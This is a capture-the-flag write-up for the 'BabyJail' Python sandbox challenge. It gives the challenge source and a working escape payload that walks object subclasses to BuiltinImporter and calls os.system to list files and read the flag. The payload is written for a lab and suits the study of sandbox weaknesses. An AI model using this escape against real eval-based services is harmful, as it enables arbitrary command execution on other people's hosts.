# BabyJail
 
## Description:
Just a normal pyjail without builtins!

## Source code:
```
#!/usr/local/bin/python3
print(eval(input('> '), {"__builtins__": {}}, {}))
```

## Challenge:
This program is a basic "pyjail" challenge where the goal is to break out of the restricted environment and run commands on the host system. The program runs the users commands with the `eval()` function in python, however there are a few tricks.

`{"__builtins__": {}}` - The second argument to `eval()` is the globals dictionary. By passing `{"__builtins__": {}}`, the code tries to restrict access to Python's built-in functions and modules like `open`, `exec`, or `os`. Referencing these will result in a `NameError` as the functions are not defined.

`{}` - The third argument to `eval()` is the locals dictionary. By passing an empty dictionary, the code prevents any local variables or functions from being accessible within the evaluated expression, once again causing a `NameError`.

Despite the restrictions, this sandbox can often be bypassed because `eval()` still allows Python expressions, which may provide access to restricted functionality.

## Solution:

I was able to access hidden attributes by using this python expression to list classes in use in the python environment:
`().__class__.__base__.__subclasses__()`

This returned a large list of python classes, which I tried to filter down to classes with reference to the the `os` module:
`[cls for cls in ().__class__.__base__.__subclasses__() if 'os' in str(cls)]`

However access to the `str` function is not possible, so I copied the output into a file and manually looked for functions of interest. Grepping for `os` returned me `<class 'os._wrap_close'>` at index 155, however I was unable to find any functions I could use to spawn a shell or read a file using this class.

It seemed here that there were a large number of classes that could work as an exploit to this system, and eventually I stumbled across `<class '_frozen_importlib.BuiltinImporter'>` which provided access to the `os` module and the `system` function, allowing me to execute commands. Finally I just had to find the location of the `BuiltinImporter` in the classes list, which I did using list comprehension to search for the class in the output of `().__class__.__base__.__subclasses__()`

```┌──(kali㉿kali)-[~/Downloads]
└─$ nc 172.31.3.2 8002
> [x for x in [].__class__.__base__.__subclasses__() if x.__name__ == 'BuiltinImporter'][0]().load_module('os').system("ls")
bin
boot
dev
etc
flag_LwAyYvKd
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
0
```
Then finally it was just a case of changing the command to print the contents of the flag file for the final payload of:
`[x for x in  [].__class__.__base__.__subclasses__() if x.__name__ == 'BuiltinImporter'][0]().load_module('os').system("cat flag_LwAyYvKd")`
